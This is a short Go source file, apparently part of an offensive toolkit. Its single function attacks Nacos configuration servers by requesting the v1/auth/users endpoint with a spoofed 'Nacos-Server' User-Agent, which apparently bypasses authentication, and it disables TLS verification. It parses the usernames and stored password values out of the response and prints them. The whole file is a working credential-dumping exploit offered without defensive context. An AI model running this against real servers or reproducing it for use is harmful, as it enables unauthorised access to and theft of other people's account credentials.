package lib

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
)

func GetNacosUser(res string) {
	httpClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	urls := res + "v1/auth/users?pageNo=1&pageSize=9"
	req, err := http.NewRequest("GET", urls, nil)
	if err != nil {
		fmt.Println("请求创建失败：", err)
		return
	}

	req.Header.Set("User-Agent", "Nacos-Server")

	resp, err := httpClient.Do(req)
	if err != nil {
		fmt.Println("请求发送失败：", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取响应内容失败：", err)
		return
	}
	fmt.Println("用户名密码获取成功！\n结果如下：")
	usernameRegex := regexp.MustCompile(`"username":"(.*?)"`)
	passwordRegex := regexp.MustCompile(`"password":"(.*?)"`)

	usernameMatches := usernameRegex.FindAllStringSubmatch(string(body), -1)
	passwordMatches := passwordRegex.FindAllStringSubmatch(string(body), -1)

	var usernames []string
	var passwords []string

	for _, match := range usernameMatches {
		usernames = append(usernames, match[1])
	}

	for _, match := range passwordMatches {
		passwords = append(passwords, match[1])
	}

	for i := 0; i < len(usernames) && i < len(passwords); i++ {
		fmt.Println("用户名:", usernames[i])
		fmt.Println("密码:", passwords[i])
	}
}
